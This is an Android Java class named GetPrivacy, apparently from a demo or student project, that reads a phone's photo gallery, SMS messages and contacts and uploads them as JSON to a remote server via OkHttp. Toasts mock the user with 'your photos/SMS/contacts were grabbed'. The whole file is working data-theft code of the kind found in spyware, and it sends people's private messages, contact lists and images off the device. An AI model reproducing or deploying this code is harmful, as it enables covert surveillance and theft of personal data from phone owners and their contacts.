package com.gproject.tool;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Toast;
import com.google.gson.Gson;
import com.gproject.MySqlData;
import com.gproject.entity.AddressListEntity;
import com.gproject.entity.MessageEntity;
import com.gproject.entity.UphotoEntity;
import okhttp3.*;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class GetPrivacy {


    public static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");

    private String url;
    private Context context;
    private String owner;

    public GetPrivacy(Context context) {
        this .context = context;
        owner = ((MySqlData)context.getApplicationContext()).getCustomerEntity().getPhone();
        url =  ((MySqlData)context.getApplicationContext()).getURL();
    }



    public void getImage() {

        List<UphotoEntity> uphotoEntityList = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, MediaStore.Images.Media.DATE_TAKEN);
        int count = 0;
        byte[] data = null;
        while (cursor.moveToNext()) {
            UphotoEntity uphotoEntity = new UphotoEntity();
            //获取图片的名称

            String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
            //获取图片的生成日期
            String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
            data = imageToByte(path);

            //获取图片的详细信息
            String time = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN));
            Long date = Long.parseLong(time);
            Date date1 = new Date(date);
            uphotoEntity.setName(name);
            uphotoEntity.setTime(date1);
            uphotoEntity.setPhoto(data);
            uphotoEntity.setOwner(owner);
            uphotoEntityList.add(uphotoEntity);
            count++;
            if(count>2)
            break;

        }


        Gson gson = new Gson();
        String URL = url +"pushphoto";

        RequestBody body = RequestBody.create(JSON, gson.toJson(uphotoEntityList));


        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder()
                .post(body)
                .url(URL)
                .build();
        Call call = client.newCall(request);


        //异步调用,并设置回调函数
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e("yzphoto", "yzphotoFail");
            }

            @Override
            public void onResponse(Call call, final Response response) throws IOException {

                Looper.prepare();
                Toast.makeText(context, "嘿,你的图片被抓走了", Toast.LENGTH_SHORT).show();
                Looper.loop();
            }
        });






    }

    public byte[] imageToByte(String path) {
        // 将图片文件转化为字节数组字符串，并对其进行Base64编码处理
        byte[] data = null;
        // 读取图片字节数组
        try {

            InputStream in = new FileInputStream(path);

            data = new byte[in.available()];

            in.read(data);

            in.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return data;
    }




    public void addMsgs() {
        List<MessageEntity>messageEntityList = new ArrayList<>();
        Uri uri = Uri.parse("content://sms/");
        ContentResolver resolver = context.getContentResolver();
        //获取的是哪些列的信息
        Cursor cursor = resolver.query(uri, new String[]{"address", "date", "type", "body"}, null, null, null);
        int count = 0;
        while (cursor.moveToNext()) {
            String address = cursor.getString(0);
            Long date = cursor.getLong(1);
            String type = cursor.getString(2);
            if (type.equals("1")) {
                type = "接收";
            } else {
                type = "发送";
            }
            String body = cursor.getString(3);

            Date date1 = new Date(date);
            MessageEntity messageEntity = new MessageEntity();
            //写进数据库
            messageEntity.setPhone(address);
            messageEntity.setTime(date1);
            messageEntity.setType(type);
            messageEntity.setContent(body);
            messageEntity.setOwner(owner);
            messageEntityList.add(messageEntity);

            count++;
            if (count > 9)
                break;


        }
        cursor.close();

        Gson gson = new Gson();
        String msg = gson.toJson(messageEntityList);
        String URL = url + "pushmsg";
        FormBody formBody = new FormBody.Builder()
                .add("msg", msg)
                .build();


        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder()
                .post(formBody)
                .url(URL)
                .build();
        Call call = client.newCall(request);


        //异步调用,并设置回调函数
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e("yzmsg", "yzmsgFail");
            }

            @Override
            public void onResponse(Call call, final Response response) throws IOException {

                Looper.prepare();
                Toast.makeText(context, "嘿,你的手机短信被抓走了", Toast.LENGTH_SHORT).show();
                Looper.loop();
            }
        });


    }




    public String getTxl() {
        List<AddressListEntity> addressListEntityList = new ArrayList<>();
        String[] cols = {ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};
        Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                cols, null, null, null);
        int count = 0;
        for (int i = 0; i < cursor.getCount(); i++) {
            cursor.moveToPosition(i);
            count++;
            // 取得联系人名字
            int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
            int numberFieldColumnIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            AddressListEntity addressListEntity = new AddressListEntity();

            //通讯录联系人 电话
            String name = cursor.getString(nameFieldColumnIndex);
            String number = cursor.getString(numberFieldColumnIndex);
            addressListEntity.setName(name);
            addressListEntity.setPhone(number);
            addressListEntity.setOwner(owner);
            addressListEntityList.add(addressListEntity);

            if (count > 9) {
                break;
            }
        }
        Gson gson = new Gson();
        return gson.toJson(addressListEntityList);
    }


    public void addTxl() {
        String txl = getTxl();
        String URL = url +"addtxl";
  //      String URL = "http://192.168.43.73:1234/addtxl";


        FormBody formBody = new FormBody.Builder()
                .add("txl", txl)
                .build();


        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder()
                .post(formBody)
                .url(URL)
                .build();
        Call call = client.newCall(request);


        //异步调用,并设置回调函数
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e("yztxl", "yztxlFail");
            }

            @Override
            public void onResponse(Call call, final Response response) throws IOException {

                Looper.prepare();
                Toast.makeText(context, "嘿,你的通讯录被抓走了", Toast.LENGTH_SHORT).show();
                Looper.loop();
            }
        });
    }

}
